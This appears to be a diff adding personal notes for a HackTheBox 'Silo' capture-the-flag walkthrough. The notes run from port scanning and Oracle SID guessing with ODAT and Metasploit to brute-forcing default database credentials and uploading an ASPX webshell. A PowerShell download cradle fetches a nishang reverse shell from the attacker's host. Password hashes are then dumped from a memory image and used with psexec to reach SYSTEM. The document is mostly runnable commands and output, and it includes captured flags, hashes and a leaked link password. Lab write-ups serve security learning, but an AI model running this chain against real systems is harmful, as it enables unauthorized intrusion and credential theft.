@@ -1,0 +1,385 @@
+let's enumerate first:
+command: sudo rustscan -a 10.10.10.82
+result:
+PORT      STATE SERVICE REASON
+1521/tcp  open  oracle  syn-ack ttl 127
+5985/tcp  open  wsman   syn-ack ttl 127
+47001/tcp open  winrm   syn-ack ttl 127
+49152/tcp open  unknown syn-ack ttl 127
+49153/tcp open  unknown syn-ack ttl 127
+49154/tcp open  unknown syn-ack ttl 127
+49155/tcp open  unknown syn-ack ttl 127
+49159/tcp open  unknown syn-ack ttl 127
+49160/tcp open  unknown syn-ack ttl 127
+49161/tcp open  unknown syn-ack ttl 127
+49162/tcp open  unknown syn-ack ttl 127
+
+command: sudo nmap -sSVC -A -p 1521,5985,47001,49152,49153,49154,4955,49159,49160,49161,49162 10.10.10.82
+result:
+PORT      STATE  SERVICE    VERSION
+1521/tcp  open   oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
+4955/tcp  closed unknown
+5985/tcp  open   http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+47001/tcp open   http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49152/tcp open   msrpc      Microsoft Windows RPC
+49153/tcp open   msrpc      Microsoft Windows RPC
+49154/tcp open   msrpc      Microsoft Windows RPC
+49159/tcp open   oracle-tns Oracle TNS listener (requires service name)
+49160/tcp open   msrpc      Microsoft Windows RPC
+49161/tcp open   msrpc      Microsoft Windows RPC
+49162/tcp open   msrpc      Microsoft Windows RPC
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.93%E=4%D=7/12%OT=1521%CT=4955%CU=38036%PV=Y%DS=2%DC=T%G=Y%TM=64
+OS:ADF472%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10E%TI=I%CI=I%II=I%SS=
+OS:S%TS=7)OPS(O1=M53ANW8ST11%O2=M53ANW8ST11%O3=M53ANW8NNT11%O4=M53ANW8ST11%
+OS:O5=M53ANW8ST11%O6=M53AST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W
+OS:6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M53ANW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=
+OS:O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%
+OS:DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O
+OS:=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80
+OS:%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q
+OS:=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y
+OS:%DFI=N%T=80%CD=Z)
+
+access: http://10.10.10.82/
+
+command: gobuster -u http://10.10.10.82/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html -t 30
+
+Oracle Db Port 1521
+
+please download sqlplus skd and basic 
+https://github.com/f00b4r/oracle-instantclient
+
+put on /opt.
+root@donika-pentest-81Y4:/opt/oracle# ls -al
+total 68912
+drwxr-xr-x 3 root root     4096 Jul 12 04:42 .
+drwx--x--x 6 root root     4096 Jul 12 04:47 ..
+drwxr-xr-x 3 root root     4096 Jul 12 04:42 instantclient_12_2
+-rw-r--r-- 1 root root 68965195 Jul 12 04:41 instantclient-basic-linux.x64-12.2.0.1.0.zip
+-rw-r--r-- 1 root root   674743 Jul 12 04:41 instantclient-sdk-linux.x64-12.2.0.1.0.zip
+-rw-r--r-- 1 root root   904309 Jul 12 04:42 instantclient-sqlplus-linux.x64-12.2.0.1.0.zip
+
+add this to .zshrc:
+alias sqlplus='/opt/oracle/instantclient_12_2/sqlplus'
+# export PATH=/root/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/didier:/usr/local/go/bin’
+export SQLPATH=/opt/oracle/instantclient_12_2
+export TNS_ADMIN=/opt/oracle/instantclient_12_2
+export LD_LIBRARY_PATH=/opt/oracle/instantclient_12_2
+export ORACLE_HOME=/opt/oracle/instantclient_12_2
+
+install odat Oracle Database Attacking Tool (ODAT) from this repo:
+https://github.com/quentinhardy/odat/releases/ to /opt
+add this .bashrc config:
+alias odat='export LD_LIBRARY_PATH=/opt/odat-libc2.17-x86_64/; cd /opt/odat-libc2.17-x86_64/; ./odat-libc2.17-x86_64; cd -'
+
+command: source .zshrc
+
+identify sid:
+root@donika-pentest-81Y4:/opt/odat-libc2.17-x86_64# ./odat-libc2.17-x86_64 sidguesser -s 10.10.10.82
+
+[1] (10.10.10.82:1521): Searching valid SIDs
+[1.1] Searching valid SIDs thanks to a well known SID list on the 10.10.10.82:1521 server
+[+] 'XE' is a valid SID. Continue...         #######################################################################################################################  | ETA:  00:00:00 100% |################################################################################################################################################################| Time: 00:00:41 
+[1.2] Searching valid SIDs thanks to a brute-force attack on 1 chars now (10.10.10.82:1521)
+100% |################################################################################################################################################################| Time: 00:00:01 
+[1.3] Searching valid SIDs thanks to a brute-force attack on 2 chars now (10.10.10.82:1521)
+[+] 'XE' is a valid SID. Continue...         #######################################################################################################                  | ETA:  00:00:03 
+100% |################################################################################################################################################################| Time: 00:00:33 
+[+] SIDs found on the 10.10.10.82:1521 server: XE
+
+sig guesser from msfconsole:
+msf6 auxiliary(admin/oracle/sid_brute) > options
+
+Module options (auxiliary/admin/oracle/sid_brute):
+
+   Name     Current Setting            Required  Description
+   ----     ---------------            --------  -----------
+   RHOSTS   10.10.10.82                yes       The target host(s), see https://docs.metasp
+                                                 loit.com/docs/using-metasploit/basics/using
+                                                 -metasploit.html
+   RPORT    1521                       yes       The target port (TCP)
+   SIDFILE  /snap/metasploit-framewor  no        The file that contains a list of sids.
+            k/776/opt/metasploit-fram
+            ework/embedded/framework/
+            data/wordlists/sid.txt
+   SLEEP    1                          no        Sleep() amount between each request.
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(admin/oracle/sid_brute) > run
+[*] Running module against 10.10.10.82
+
+[*] 10.10.10.82:1521 - Starting brute force on 10.10.10.82, using sids from /snap/metasploit-framework/776/opt/metasploit-framework/embedded/framework/data/wordlists/sid.txt...
+[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID 'XE'
+[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID 'PLSExtProc'
+
+create brute force script and get worlist from sec list:
+oracle-betterdefaultpasslist.txt
+python script on silo folder brute_force.py.
+
+command: python3 brute_force.py 10.10.10.82 oracle-betterdefaultpasslist.txt
+ XTR/XTR                               Found SCOTT / tiger                           
+
+
+ SCOTT/TIGGER   
+
+command: sqlplus SCOTT/tiger@10.10.10.82:1521/XE                                 
+
+SQL*Plus: Release 12.2.0.1.0 Production on Wed Jul 12 08:00:54 2023
+
+Copyright (c) 1982, 2016, Oracle.  All rights reserved.
+
+ERROR:
+ORA-28002: the password will expire within 7 days
+
+
+
+Connected to:
+Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
+
+SQL> select * from user_role_privs;
+
+USERNAME		       GRANTED_ROLE		      ADM DEF OS_
+------------------------------ ------------------------------ --- --- ---
+SCOTT			       CONNECT			      NO  YES NO
+SCOTT			       RESOURCE 		      NO  YES NO
+
+command: sqlplus SCOTT/tiger@10.10.10.82:1521/XE as sysdba
+
+SQL*Plus: Release 12.2.0.1.0 Production on Wed Jul 12 08:01:41 2023
+
+Copyright (c) 1982, 2016, Oracle.  All rights reserved.
+
+
+Connected to:
+Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
+
+SQL> select * from user_role_privs;
+
+USERNAME		       GRANTED_ROLE		      ADM DEF OS_
+------------------------------ ------------------------------ --- --- ---
+SYS			       ADM_PARALLEL_EXECUTE_TASK      YES YES NO
+SYS			       APEX_ADMINISTRATOR_ROLE	      YES YES NO
+SYS			       AQ_ADMINISTRATOR_ROLE	      YES YES NO
+SYS			       AQ_USER_ROLE		      YES YES NO
+SYS			       AUTHENTICATEDUSER	      YES YES NO
+SYS			       CONNECT			      YES YES NO
+SYS			       CTXAPP			      YES YES NO
+SYS			       DATAPUMP_EXP_FULL_DATABASE     YES YES NO
+SYS			       DATAPUMP_IMP_FULL_DATABASE     YES YES NO
+SYS			       DBA			      YES YES NO
+SYS			       DBFS_ROLE		      YES YES NO
+
+USERNAME		       GRANTED_ROLE		      ADM DEF OS_
+------------------------------ ------------------------------ --- --- ---
+SYS			       DELETE_CATALOG_ROLE	      YES YES NO
+SYS			       EXECUTE_CATALOG_ROLE	      YES YES NO
+SYS			       EXP_FULL_DATABASE	      YES YES NO
+SYS			       GATHER_SYSTEM_STATISTICS       YES YES NO
+SYS			       HS_ADMIN_EXECUTE_ROLE	      YES YES NO
+SYS			       HS_ADMIN_ROLE		      YES YES NO
+SYS			       HS_ADMIN_SELECT_ROLE	      YES YES NO
+SYS			       IMP_FULL_DATABASE	      YES YES NO
+SYS			       LOGSTDBY_ADMINISTRATOR	      YES YES NO
+SYS			       OEM_ADVISOR		      YES YES NO
+SYS			       OEM_MONITOR		      YES YES NO
+
+USERNAME		       GRANTED_ROLE		      ADM DEF OS_
+------------------------------ ------------------------------ --- --- ---
+SYS			       PLUSTRACE		      YES YES NO
+SYS			       RECOVERY_CATALOG_OWNER	      YES YES NO
+SYS			       RESOURCE 		      YES YES NO
+SYS			       SCHEDULER_ADMIN		      YES YES NO
+SYS			       SELECT_CATALOG_ROLE	      YES YES NO
+SYS			       XDBADMIN 		      YES YES NO
+SYS			       XDB_SET_INVOKER		      YES YES NO
+SYS			       XDB_WEBSERVICES		      YES YES NO
+SYS			       XDB_WEBSERVICES_OVER_HTTP      YES YES NO
+SYS			       XDB_WEBSERVICES_WITH_PUBLIC    YES YES NO
+
+32 rows selected.
+
+command: ./odat-libc2.17-x86_64 all -s 10.10.10.82 -d XE -U SCOTT -P tiger --sysdba
+[+] Checking if target 10.10.10.82:1521 is well configured for a connection...
+[+] According to a test, the TNS listener 10.10.10.82:1521 is well configured. Continue...
+
+[1] (10.10.10.82:1521): Is it vulnerable to TNS poisoning (CVE-2012-1675)?
+[+] The target is vulnerable to a remote TNS poisoning
+
+[2] (10.10.10.82:1521): Testing all authenticated modules on sid:XE with the SCOTT/tiger account
+[2.1] UTL_HTTP library ?
+[+] OK
+[2.2] HTTPURITYPE library ?
+[+] OK
+[2.3] UTL_FILE library ?
+[+] OK
+[2.4] JAVA library ?
+[-] KO
+[2.5] DBMSADVISOR library ?
+[+] OK
+[2.6] DBMSSCHEDULER library ?
+[+] OK
+[2.7] CTXSYS library ?
+[+] OK
+[2.8] Hashed Oracle passwords ?
+[+] OK
+[2.9] Hashed Oracle passwords from history?
+[+] OK
+[2.10] DBMS_XSLPROCESSOR library ?
+[+] OK
+[2.11] External table to read files ?
+[+] OK
+[2.12] External table to execute system commands ?
+[+] OK
+[2.13] Oradbg ?
+[-] KO
+[2.14] DBMS_LOB to read files ?
+[+] OK
+[2.15] SMB authentication capture ?
+[+] Perhaps (try with --capture to be sure)
+[2.16] Gain elevated access (privilege escalation)?
+[2.16.1] DBA role using CREATE/EXECUTE ANY PROCEDURE privileges?
+[+] OK
+[2.16.2] Modification of users' passwords using CREATE ANY PROCEDURE privilege only?
+[-] KO
+[2.16.3] DBA role using CREATE ANY TRIGGER privilege?
+[-] KO
+[2.16.4] DBA role using ANALYZE ANY (and CREATE PROCEDURE) privileges?
+[-] KO
+[2.16.5] DBA role using CREATE ANY INDEX (and CREATE PROCEDURE) privileges?
+[-] KO
+[2.17] Modify any table while/when he can select it only normally (CVE-2014-4237)?
+[+] Impossible to know
+[2.18] Create file on target (CVE-2018-3004)?
+[-] KO
+[2.19] Obtain the session key and salt for arbitrary Oracle users (CVE-2012-3137)?
+[-] KO
+
+[3] (10.10.10.82:1521): Oracle users have not the password identical to the username ?
+The login XS$NULL has already been tested at least once. What do you want to do:TA:  00:00:00 
+- stop (s/S)
+- continue and ask every time (a/A)
+- skip and continue to ask (p/P)
+- continue without to ask (c/C)
+c
+[!] Notice: 'XS$NULL' account is locked, so skipping this username for password
+[!] Notice: 'APEX_040000' account is locked, so skipping this username for password  00:00:18 
+[!] Notice: 'APEX_PUBLIC_USER' account is locked, so skipping this username for password00:13 
+[!] Notice: 'FLOWS_FILES' account is locked, so skipping this username for password  00:00:11 
+[!] Notice: 'HR' account is locked, so skipping this username for password   | ETA:  00:00:09 
+[!] Notice: 'MDSYS' account is locked, so skipping this username for password| ETA:  00:00:08 
+[!] Notice: 'XDB' account is locked, so skipping this username for password  | ETA:  00:00:06 
+[!] Notice: 'CTXSYS' account is locked, so skipping this username for password ETA:  00:00:05 
+[!] Notice: 'APPQOSSYS' account is locked, so skipping this username for passwordA:  00:00:04 
+[!] Notice: 'DBSNMP' account is locked, so skipping this username for password ETA:  00:00:03 
+[!] Notice: 'ORACLE_OCM' account is locked, so skipping this username for password:  00:00:02 
+[!] Notice: 'DIP' account is locked, so skipping this username for password  | ETA:  00:00:02 
+[!] Notice: 'OUTLN' account is locked, so skipping this username for password| ETA:  00:00:01 
+[!] Notice: 'SYSTEM' account is locked, so skipping this username for password ETA:  00:00:00 
+100% |#######################################################################| Time: 00:00:10 
+[-] No found a valid account on 10.10.10.82:1521/sid:XE with usernameLikePassword module
+
+command: ./odat-libc2.17-x86_64 dbmsxslprocessor -s 10.10.10.82 -d XE -U SCOTT -P tiger --sysdba --putFile C:\\inetpub\\wwwroot 0xdf.txt <(echo 0xdf was here)
+result:
+[1] (10.10.10.82:1521): Put the /dev/fd/63 local file in the C:\inetpub\wwwroot path (named 0xdf.txt) of the 10.10.10.82 server
+[+] The /dev/fd/63 local file was put in the remote C:\inetpub\wwwroot path (named 0xdf.txt)
+
+command: ./odat-libc2.17-x86_64 dbmsxslprocessor -s 10.10.10.82 -d XE -U SCOTT -P tiger --sysdba --putFile C:\\inetpub\\wwwroot 0xdf.aspx /home/donika-pentest/Documents/davtest/cmdasp.aspx
+result:
+[1] (10.10.10.82:1521): Put the /home/donika-pentest/Documents/davtest/cmdasp.aspx local file in the C:\inetpub\wwwroot path (named 0xdf.aspx) of the 10.10.10.82 server
+[+] The /home/donika-pentest/Documents/davtest/cmdasp.aspx local file was put in the remote C:\inetpub\wwwroot path (named 0xdf.aspx)
+
+access: http://10.10.10.82/0xdf.aspx
+
+get nishang script from here:
+https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
+put end of line this script:
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.19 -Port 7979
+command: python3 -m http.server 4444
+
+put this code to input field on webshell 0xdf.aspx:
+powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.16.19:4444/Invoke-PowerShellTcp.ps1')
+
+result:
+PS C:\windows\system32\inetsrv>
+
+PS C:\windows\system32\inetsrv>type \users\Phineas\Desktop\user.txt
+71fcdeae6e3965eb18396a714764432c
+
+PS C:\windows\system32\inetsrv> type "\users\Phineas\Desktop\Oracle issue.txt"
+Support vendor engaged to troubleshoot Windows / Oracle performance issue (full memory dump requested):
+
+Dropbox link provided to vendor (and password under separate cover).
+
+Dropbox link 
+https://www.dropbox.com/sh/69skryzfszb7elq/AADZnQEbbqDoIf5L2d0PBxENa?dl=0
+
+link password:
+?%Hm8646uC$
+
+download .txt and password will be: 
+£%Hm8646uC$
+
+PS C:\windows\system32\inetsrv> systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+
+download from dropbox:
+https://www.dropbox.com/sh/69skryzfszb7elq/AADZnQEbbqDoIf5L2d0PBxENa?dl=0
+
+command: volatility kdbgscan -f SILO-20180105-221806.dmp 
+result:
+**************************************************
+Instantiating KDBG using: Unnamed AS Win10x64_15063 (6.4.15063 64bit)
+Offset (V)                    : 0xf80078520a30
+Offset (P)                    : 0x2320a30
+KdCopyDataBlock (V)           : 0xf8007845f9b0
+Block encoded                 : Yes
+Wait never                    : 0xd08e8400bd4a143a
+Wait always                   : 0x17a949efd11db80
+KDBG owner tag check          : True
+Profile suggestion (KDBGHeader): Win10x64_15063
+Version64                     : 0xf80078520d90 (Major: 15, Minor: 9600)
+Service Pack (CmNtCSDVersion) : 0
+Build string (NtBuildLab)     : 9600.16384.amd64fre.winblue_rtm.
+PsActiveProcessHead           : 0xfffff80078537700 (51 processes)
+PsLoadedModuleList            : 0xfffff800785519b0 (148 modules)
+KernelBase                    : 0xfffff8007828a000 (Matches MZ: True)
+Major (OptionalHeader)        : 6
+Minor (OptionalHeader)        : 3
+KPCR                          : 0xfffff8007857b000 (CPU 0)
+KPCR                          : 0xffffd000207e8000 (CPU 1)
+
+command: volatility -f SILO-20180105-221806.dmp --profile Win2012R2x64 hashdump -y 0xffffc00000028000 -s 0xffffc00000619000
+Volatility Foundation Volatility Framework 2.6.1
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Phineas:1002:aad3b435b51404eeaad3b435b51404ee:8eacdd67b77749e65d3b3d5c110b0969:::
+
+ /home/donika-pentest/Documents/windows_exploit/blue/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 -target-ip 10.10.10.82 administrator@10.10.10.82
+Impacket v0.10.1.dev1+20230629.121115.b5dab2df - Copyright 2022 Fortra
+
+[*] Requesting shares on 10.10.10.82.....
+[*] Found writable share ADMIN$
+[*] Uploading file vdHkIaHN.exe
+[*] Opening SVCManager on 10.10.10.82.....
+[*] Creating service ucrH on 10.10.10.82.....
+[*] Starting service ucrH.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+
+C:\Users\Administrator\Desktop> type root.txt
+b824da79846a6cd89f2d95d7903fadbd
+
+resource:
+https://0xdf.gitlab.io/2018/08/04/htb-silo.html
+https://medium.com/@v1per/silo-hackthebox-writeup-cec449e0a4bc
